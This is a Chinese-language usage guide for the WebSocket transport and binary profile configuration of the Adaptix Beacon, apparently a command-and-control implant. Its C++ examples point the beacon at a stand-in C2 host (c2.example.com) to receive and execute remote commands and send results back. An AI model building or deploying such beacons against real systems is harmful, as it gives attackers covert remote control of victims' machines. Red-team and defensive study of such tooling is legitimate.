# WebSocket传输和Profile配置使用指南

## 概述

本文档说明如何在Adaptix Beacon中使用WebSocket传输协议和Profile二进制配置。

## WebSocket传输

### 特性

- **双向通信**：WebSocket提供全双工通信能力
- **持久连接**：保持长连接，减少握手开销
- **Profile支持**：可以从配置中读取二进制profile数据

### 使用方法

#### 1. 配置WebSocket传输

```cpp
#include "adaptix/beacon/beacon_config.h"
#include "adaptix/beacon/websocket_transport.h"

auto config = std::make_shared<BeaconConfig>();
config->set_server_address("127.0.0.1");
config->set_server_port(9000);
config->set_protocol(TransportProtocol::kWebSocket);
```

#### 2. 设置Profile二进制数组

Profile数据可以包含配置文件、证书、加密密钥等二进制数据：

```cpp
// 方式1：从文件读取
std::vector<std::uint8_t> LoadProfileFromFile(const std::string& filename) {
  std::ifstream file(filename, std::ios::binary);
  return std::vector<std::uint8_t>(
      std::istreambuf_iterator<char>(file),
      std::istreambuf_iterator<char>());
}

auto profile = LoadProfileFromFile("profile.bin");
config->set_profile_data(std::move(profile));

// 方式2：硬编码（测试用）
std::vector<std::uint8_t> profile_data = {
    0x50, 0x4B, 0x03, 0x04,  // 文件头
    0x14, 0x00, 0x00, 0x00,
    0x08, 0x00, 0x00, 0x00,
    0x21, 0x00, 0xAA, 0xBB,
    0xCC, 0xDD, 0xEE, 0xFF
};
config->set_profile_data(std::move(profile_data));

// 方式3：从内存加载
const std::uint8_t raw_data[] = {0x01, 0x02, 0x03, 0x04};
std::vector<std::uint8_t> profile(raw_data, raw_data + sizeof(raw_data));
config->set_profile_data(std::move(profile));
```

#### 3. 创建WebSocket传输实例

```cpp
auto transport = std::make_unique<WebSocketTransport>(config);
```

#### 4. 完整示例

```cpp
#include "adaptix/beacon/beacon.h"
#include "adaptix/beacon/beacon_config.h"
#include "adaptix/beacon/command_executor.h"
#include "adaptix/beacon/websocket_transport.h"

int main() {
  // 配置
  auto config = std::make_shared<BeaconConfig>();
  config->set_server_address("c2.example.com");
  config->set_server_port(443);
  config->set_protocol(TransportProtocol::kWebSocket);
  
  // 设置profile
  std::vector<std::uint8_t> profile = {/* ... */};
  config->set_profile_data(std::move(profile));
  
  // 创建beacon
  auto transport = std::make_unique<WebSocketTransport>(config);
  auto executor = std::make_unique<DefaultCommandExecutor>();
  
  Beacon beacon(config, std::move(transport), std::move(executor));
  beacon.Start();
  
  // 运行...
  
  beacon.Stop();
  return 0;
}
```

## Profile数据格式

Profile可以包含多种类型的配置数据：

### 1. JSON配置

```cpp
std::string json_config = R"({
  "server": "c2.example.com",
  "port": 443,
  "encryption": "AES256",
  "key": "..."
})";

std::vector<std::uint8_t> profile(json_config.begin(), json_config.end());
config->set_profile_data(std::move(profile));
```

### 2. 二进制配置文件

```cpp
// ZIP压缩的配置包
std::vector<std::uint8_t> profile = {
    0x50, 0x4B, 0x03, 0x04,  // ZIP magic number
    // ... 更多数据
};
```

### 3. 加密的配置

```cpp
// 使用AES加密的配置
std::vector<std::uint8_t> encrypted_config = EncryptConfig(raw_config, key);
config->set_profile_data(std::move(encrypted_config));
```

### 4. 证书和密钥

```cpp
struct ProfileData {
  std::vector<std::uint8_t> certificate;
  std::vector<std::uint8_t> private_key;
  std::vector<std::uint8_t> config;
};

ProfileData data = LoadProfile();
std::vector<std::uint8_t> combined;
// 组合所有数据
combined.insert(combined.end(), data.certificate.begin(), data.certificate.end());
combined.insert(combined.end(), data.private_key.begin(), data.private_key.end());
combined.insert(combined.end(), data.config.begin(), data.config.end());

config->set_profile_data(std::move(combined));
```

## WebSocket握手流程

1. **初始化连接**
   ```
   Client -> Server: HTTP Upgrade Request
   ```

2. **发送Profile数据**（在握手时）
   ```
   Client -> Server: Profile Data (Binary)
   ```

3. **服务器验证**
   ```
   Server: Validate Profile
   Server -> Client: Handshake Response
   ```

4. **开始通信**
   ```
   Client <-> Server: WebSocket Frames
   ```

## 与HTTP传输的对比

| 特性 | HTTP | WebSocket |
|------|------|-----------|
| 连接方式 | 短连接 | 长连接 |
| 通信模式 | 请求-响应 | 双向 |
| 开销 | 每次请求都有HTTP头 | 握手后开销小 |
| 实时性 | 需要轮询 | 服务器可主动推送 |
| Profile支持 | 通过POST发送 | 握手时发送 |

## 配置选项

```cpp
class BeaconConfig {
  // 服务器配置
  void set_server_address(const std::string& address);
  void set_server_port(uint16_t port);
  
  // 协议选择
  void set_protocol(TransportProtocol protocol);
  // TransportProtocol::kHttp
  // TransportProtocol::kHttps
  // TransportProtocol::kWebSocket  ← WebSocket
  
  // Profile数据
  void set_profile_data(std::vector<std::uint8_t> profile);
  const std::vector<std::uint8_t>& profile_data() const;
};
```

## 访问Profile数据

在Transport实现中访问profile：

```cpp
class WebSocketTransport : public Transport {
 private:
  bool PerformHandshake() {
    const auto& profile = config_->profile_data();
    
    if (!profile.empty()) {
      // 发送profile到服务器
      SendProfileData(profile);
    }
    
    return true;
  }
};
```

## 编译和运行

### 编译WebSocket版本

```bash
cd modern_cpp_beacon
mkdir build && cd build
cmake ..
make
```

### 运行示例

```bash
# WebSocket示例
./beacon_agent_websocket

# HTTP示例
./beacon_agent

# C++20特性示例
./beacon_agent_cpp20
```

### 输出示例

```
=== Adaptix Beacon with WebSocket ===
Server: 127.0.0.1:9000
Protocol: WebSocket
Profile size: 20 bytes
=====================================

[Main] Beacon started, running for 10 seconds...
[WebSocket] Performing handshake with 127.0.0.1:9000
[WebSocket] Using profile data (20 bytes)
[WebSocket] Sending result: {"task_id":"ws-task-001","status":"2","output":"..."}
[Main] Beacon stopped.
```

## 安全建议

1. **加密Profile**：敏感配置应该加密后再存储
2. **验证完整性**：使用HMAC验证profile未被篡改
3. **安全传输**：使用WSS（WebSocket over TLS）
4. **访问控制**：验证连接的客户端身份

## 扩展示例

### 自定义Profile解析器

```cpp
class ProfileParser {
 public:
  struct ParsedProfile {
    std::string server;
    uint16_t port;
    std::vector<std::uint8_t> encryption_key;
  };
  
  static ParsedProfile Parse(const std::vector<std::uint8_t>& data) {
    ParsedProfile result;
    // 解析二进制数据
    // ...
    return result;
  }
};

// 使用
const auto& profile_data = config->profile_data();
auto parsed = ProfileParser::Parse(profile_data);
```

### Profile生成工具

```cpp
class ProfileBuilder {
 public:
  ProfileBuilder& SetServer(const std::string& server) {
    server_ = server;
    return *this;
  }
  
  ProfileBuilder& SetPort(uint16_t port) {
    port_ = port;
    return *this;
  }
  
  ProfileBuilder& SetEncryptionKey(const std::vector<std::uint8_t>& key) {
    key_ = key;
    return *this;
  }
  
  std::vector<std::uint8_t> Build() {
    std::vector<std::uint8_t> result;
    // 序列化所有数据
    // ...
    return result;
  }
  
 private:
  std::string server_;
  uint16_t port_;
  std::vector<std::uint8_t> key_;
};

// 使用
auto profile = ProfileBuilder()
    .SetServer("c2.example.com")
    .SetPort(443)
    .SetEncryptionKey(key)
    .Build();

config->set_profile_data(std::move(profile));
```

## 参考

- [WebSocket RFC 6455](https://tools.ietf.org/html/rfc6455)
- [Beacon配置架构](ARCHITECTURE.md)
- [使用示例](EXAMPLES.md)
